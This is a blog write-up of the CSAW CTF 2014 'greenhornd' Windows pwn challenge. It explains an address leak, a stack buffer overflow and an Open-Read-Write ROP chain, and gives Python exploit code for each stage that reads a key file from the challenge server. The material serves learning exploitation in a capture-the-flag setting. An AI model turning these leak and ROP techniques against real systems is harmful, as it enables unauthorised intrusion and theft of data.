---
layout: post
title: "CSAW CTF 2014: greenhornd Writeup"
date: 2020-09-05
tags: [x86, Pwn] 
description: The post explains how to solve the greenhornd challenge from CSAW CTF 2014. 
---

# Introduction

Nowadays, I'm trying to learn windows exploitation by reading the tutorials and solving tasks that recommended by open-source [seminar](https://github.com/leesh3288/WinPwn/tree/master/Seminar/2019_Winter_WinPwn) written with the Korean language (Thanks to google translate) besides other external resources. So, I decided to provide writeups for the chosen challenges existed within the seminar repository.

Consequently, I am going today to solve my first 32-bit windows pwn challenge within window10 which is greenhornd from CSAW CTF 2014 using the Open-Read-Write ROP chain to read the file named key from a remote server. Additionally, I will use [AppJailLauncher](https://www.trailofbits.com/expertise/appjaillauncher/) to launch the exe file for providing a game server experience using the following command.

> CommandLine
{:.filename}
{% highlight bash %}
AppJailLauncher.exe /network /key:key /port:9998 /timeout:30 greenhornd.exe
{% endhighlight %}


# Finding the Vulnerability

First of All, I executed the greenhornd exe, and the following text got printed to the screen which asks you to find the secret key and it suggested that you can look at strings within the binary using strings utility or IDA disassembler (sorry I will use R2 cutter xD ).

![img]({{'/assets/images/greenhornd/pwn1.png' | relative_url }}){: .center-image }*(**Figure[1]**)*

So, I started to check the strings using Cutter and find the secret password which is **GreenhornSecretPassword!!!** as appear in **Figure[2]**.

![img]({{'/assets/images/greenhornd/pwn2.png' | relative_url }}){: .center-image }*(**Figure[2]**)*

After inputting the secret password, a menu with the following options printed to the screen as appear in **Figure[3]**.

![img]({{'/assets/images/greenhornd/pwn3.png' | relative_url }}){: .center-image }*(**Figure[3]**)*

As appear in **Figure[4]**, These options are represented in the disassembly by switch table for achieving the jump to certain function based on your choice. However, I'm just interested in only two options which are **(A)SLR** and **(V)ulnerability**.

![img]({{'/assets/images/greenhornd/pwn4.png' | relative_url }}){: .center-image }*(**Figure[4]**)*


Let's start with the (A)SLR option, It prints text about Address Layout Randomization in windows beside give us two anonymous addresses as appear in the next figure.

![img]({{'/assets/images/greenhornd/pwn5.png' | relative_url }}){: .center-image }*(**Figure[5]**)*

So let us back to the disassembler to figure out what these two addresses. As you see inside the red-colored rectangle block within **Figure[6]**, The function **A_SLR** gets the module handle of the current process through WinApi **GetModuleHandle** which is the same as the ImageBase address of exe in memory then save ImageBase subtracted by value **0x400000** in the variable on the stack. Afterward, It sends the **ImageBase-0x400000** and the address holding it to the function **WriteAddressesToStdout** to print them respectively as appear in a blue-colored rectangle block.

![img]({{'/assets/images/greenhornd/pwn6.png' | relative_url }}){: .center-image }*(**Figure[6]**)*

Now we are done with **(A)SLR**, So let us start checking the **(V)urlnerability** option. As you see in the following screenshot, there is a text that asks you to input 1024 characters with some constraints in the input string.

![img]({{'/assets/images/greenhornd/pwn7.png' | relative_url }}){: .center-image }*(**Figure[7]**)*

Let's jump to the **Vulnerable_Function** to analyze it and check what the type of vulnerability it contains. The instructions within the red-colored block in **Figure[8]** holds responsibility for reading a string from stdin to the buffer at stack address equal to **(ebp-400h)** with a max length of **2048** characters. Therefore, The classic buffer overflow vulnerability exists as the max size of the string exceeds the size of the buffer specified for the input string which is **1024** characters. 

However, The function can exit without returning which will prevent the execution of overwritten saved return address if the string does not achieve a certain constraint. As appear in the blue-colored block which is responsible for the last-mentioned constraint, The instructions check if the **1st character** equal to **'C'** or **2nd character** equal to **'S'** or **3rd character** is equal to '**A'** or **4th character** equal to **'W'** to return otherwise the function exit without returning.

![img]({{'/assets/images/greenhornd/pwn8.png' | relative_url }}){: .center-image }*(**Figure[8]**)*


# Exploiting the vulnerable function

Based on previous analysis, We concluded that the **Vulnerable_Function** contains Buffer overflow vulnerability and we will exploit that vulnerability to build our Open-Read-write ROP chain. So let's define our stack layout that achieves the goal of reading the file named **key** then prints it content to stdout.

As appear in **Figure[9]**, The left-hand side represents the stack state before overflowing while The right-hand side of the diagram represents the stack layout after overflowing with appropriate values that mirror the Open-Read-Write ROP chain. 

The Blue-colored block within the following Figure represents functions/ROP Gadgets address. On the other hand, The orange blocks represent the parameters for the functions. Additionally, The grey text within the blocks represents the value of that block. 

Also, The parameters labeled with the same number as a certain function are parameters of this function. 

![img]({{'/assets/images/greenhornd/pwn9.png' | relative_url }}){: .center-image }*(**Figure[9]**)*

As you see in the previous diagram, There are missing addresses that will be needed to build our ROP chain. These values are OpenFile, ReadFile, WriteToStdout, ImageBase, and finally stack address that represents InputAddress.

As appear in **Figure[5]**, The **(A)SLR** option leak the **ImageBase-0x400000** and stack address that hold it. So, We will use them to estimate ImageBase by adding the same subtracted value. Also, InputAddress will be calculated by adding the offset(between the stack address holding **ImageBase-0x400000** and the InputAddress) which equals **0x3F4** to stack leaked address as you see in the following code snippet.

> First leakage stage in python
{:.filename}
{% highlight Python %}
def First_Leakage_Stage(conn):
 print("[x] working on First Leakage Stage...")
 try: 
  conn.sendline(b'GreenhornSecretPassword!!!')
  conn.sendline(b'A')
  conn.recvuntil("ASLR slide is: ").decode()
  line = conn.recvuntil(".").decode()
  Base_address = int(line.split(" ")[0],16)+0x400000
  InputAddress = int(line.split(" ")[8].replace(".",""),16)-0x3f4
  print("[+] First Leakage Stage succeeded... ")
  return Base_address,InputAddress
 except:
     sys.exit(0)
{% endhighlight %}


As appear in **Figure[6]**, There is a function called **WriteToStdout** that is responsible for writing to Stdout. It takes only one parameter that represents the address of string/bytes to write it to screen and it's located at address equals **ImageBase+0x14d0**.

Now we will work on leaking the addresses of **OpenFile** and **ReadFile** WinApi functions, The ReadFile is imported in the binary file which means its address saved inside IAT at address equal to **ImageBase+0x2014**.

So, Our plan will be based on overflowing the **Vulnerable_Function** to pass the IAT entry address of ReadFile function(**ImageBase+0x2014**) as a parameter to WriteToStdout As appear in **Figure[10]**.

![img]({{'/assets/images/greenhornd/pwn10.png' | relative_url }}){: .center-image }*(**Figure[10]**)*

In the following code snippet, We will receive the ReadFile Function address from Stdout. Then we will estimate the OpenFile function which equals **Readfile address + 0x35350**.

> Second leakage stage in python
{:.filename}
{% highlight Python %}
def Second_Leakage_Stage(conn,ImageBase):
 print("[x] working on Second Leakage Stage...")
 try:   
  conn.sendline(b'V')
  Payload=  b'CSAW'+b'A'*1024
  Payload+= p32(ImageBase+0x14d0) # WriteToStdout function
  Payload+= p32(ImageBase+0x1137) # ret address = vulnerable function
  Payload+= p32(ImageBase+0x2014) # import table entry that hold readfile address within Kernel32.dll
  conn.sendline(Payload)
  conn.recvuntil("with some constraints).\n\n")
  data= conn.recv(4)
  readfile = u32(data.decode())
  openfile = readfile+0x35350
  print("[+] Second Leakage Stage succeeded... ")
  return readfile,openfile
 except: 
  print("[-] Second Leakage Stage Failed... ")
  sys.exit(0)
{% endhighlight %}


Now we have all the addresses we need to construct our ROP chain that defined in **Figure[9]** and we will achieve it by using the following snippet of code.

> Constructing ROP chains
def Open_Read_Write(conn,InputAddress,ImageBase,readfile_Fun,openfile_Fun):
 print("[x] reading key file from remote server...")   
 try:
  Payload= b'CSAW'+b'A'*1020 #Bypass condition & overflowing
  Payload+=p32(InputAddress+1056+8) # address to save the returned handle
  Payload+=p32(openfile_Fun) #address of openfile functions
  Payload+=p32(ImageBase+0x1ce8) # mov dword[ebp-8],eax gadget , eax ==> handle
  Payload+= p32(InputAddress+1248)+p32(InputAddress+1184)+p32(0) # openfile parameters , (lpname,structure,null)
  Payload+= p32(readfile_Fun) # readfile function address
  Payload+= p32(ImageBase+0x14d0) # print to screen function
  Payload+= b'b'*4 # (first parameter of readfile)random bytes which will be overwritten with handle value
  Payload+=p32(InputAddress+1084)+p32(100)+p32(0)+p32(0) # buffer+size_of_string+null+null
  Payload+= p32(ImageBase+0x128f) #exit(1) function 
  Payload+= p32(InputAddress+1084) #buffer to be printed to stdout
  Payload+= b'\x00'*100 # buffer values
  Payload+=b'c'*64 #openfile structure
  Payload+=b'key'+b'\x00' #filename
  conn.sendline(Payload)
  conn.recvuntil(".").decode() 
  print("[+] reading key file Succeeded and it contain following text:")
  print(conn.recvall().decode().split("\n")[2])
 except:
      print("[-] Failed to read file name key on remote server... ") 
      sys.exit(0)
{% endhighlight %}

The whole exploit script exists [Here](https://github.com/oviche/WindowsPwn/blob/master/greenhornd/exploit.py).





